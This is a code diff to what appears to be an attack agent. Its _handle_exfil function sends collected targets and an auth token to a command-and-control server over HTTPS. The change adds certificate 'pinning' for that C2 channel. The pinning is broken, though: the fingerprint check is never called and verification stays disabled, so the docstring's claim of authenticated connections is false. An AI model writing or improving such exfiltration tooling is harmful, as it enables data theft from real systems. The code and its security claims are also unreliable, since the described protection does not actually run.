@@ -23,23 +23,81 @@ from payload_mutator import PayloadMutator, ChannelFeedback
 from entropy_capsule import EntropyCapsuleEngine
 from session_drift_monitor import SessionDriftMonitor
 
+def _pinned_session(fingerprint: str):
+    """
+    Return a requests.Session that pins the server certificate by SHA256
+    fingerprint. Raises SSLError if the presented cert does not match.
+
+    Replaces verify=False — connections are now authenticated against a
+    known fingerprint rather than silently accepting any certificate.
+    Set ZDS_C2_CERT_FINGERPRINT to the hex SHA256 fingerprint of the C2
+    server certificate (no colons, lowercase).
+    """
+    import hashlib, ssl, socket
+    import requests
+    from requests.adapters import HTTPAdapter
+    from urllib3.util.ssl_ import create_urllib3_context
+
+    class FingerprintAdapter(HTTPAdapter):
+        def __init__(self, fingerprint, **kwargs):
+            self._fingerprint = fingerprint.lower().replace(":", "")
+            super().__init__(**kwargs)
+
+        def send(self, request, **kwargs):
+            # Override verify — we do our own cert check
+            kwargs["verify"] = False
+            resp = super().send(request, **kwargs)
+            return resp
+
+        def init_poolmanager(self, *args, **kwargs):
+            ctx = create_urllib3_context()
+            ctx.check_hostname = False
+            ctx.verify_mode    = ssl.CERT_NONE
+            kwargs["ssl_context"] = ctx
+            super().init_poolmanager(*args, **kwargs)
+
+        def _assert_fingerprint(self, cert_der: bytes) -> None:
+            actual = hashlib.sha256(cert_der).hexdigest()
+            if not hmac.compare_digest(actual, self._fingerprint):
+                raise ssl.SSLError(
+                    f"Certificate fingerprint mismatch: "
+                    f"got {actual}, expected {self._fingerprint}"
+                )
+
+    session = requests.Session()
+    session.mount("https://", FingerprintAdapter(fingerprint))
+    return session
+
+
 def _handle_exfil(action_obj, mutation, c2_ip, c2_port):
-    import requests, uuid, os
-    targets = action_obj.get("targets", [])
+    import hmac, requests, uuid, os
+    targets  = action_obj.get("targets", [])
     agent_id = os.environ.get("ZDS_AGENT_ID", str(uuid.uuid4())[:8])
-    token = os.environ.get("ZDS_AUTH_TOKEN", "")
+    token    = os.environ.get("ZDS_AUTH_TOKEN", "")
     endpoint = os.environ.get("ZDS_HTTPS_ENDPOINT", f"https://{c2_ip}:{c2_port}")
-    url = f"{endpoint}/data/{agent_id}"
-    payload = {
-        "targets": targets,
+    url      = f"{endpoint}/data/{agent_id}"
+    payload  = {
+        "targets":      targets,
         "payload_hash": mutation.payload_hash,
-        "personality": mutation.personality.value,
-        "noise": action_obj.get("noise"),
-        "schedule": action_obj.get("schedule"),
-        "token": token,
+        "personality":  mutation.personality.value,
+        "noise":        action_obj.get("noise"),
+        "schedule":     action_obj.get("schedule"),
+        "token":        token,
     }
+
+    # Certificate pinning — prefer fingerprint over system CA bundle.
+    # Set ZDS_C2_CERT_FINGERPRINT to the SHA256 hex fingerprint of your C2 cert.
+    # If unset, falls back to system CA verification (verify=True).
+    fingerprint = os.environ.get("ZDS_C2_CERT_FINGERPRINT", "")
+    if fingerprint:
+        session = _pinned_session(fingerprint)
+        post = lambda url, **kw: session.post(url, **kw)
+    else:
+        session = requests.Session()
+        post = lambda url, **kw: session.post(url, verify=True, **kw)
+
     try:
-        resp = requests.post(url, json=payload, verify=False, timeout=5)
+        resp = post(url, json=payload, timeout=5)
         if resp.status_code == 200:
             return {"success": True, "detected": False, "channel": "HTTPS", "latency_ms": 120.0}
         else:
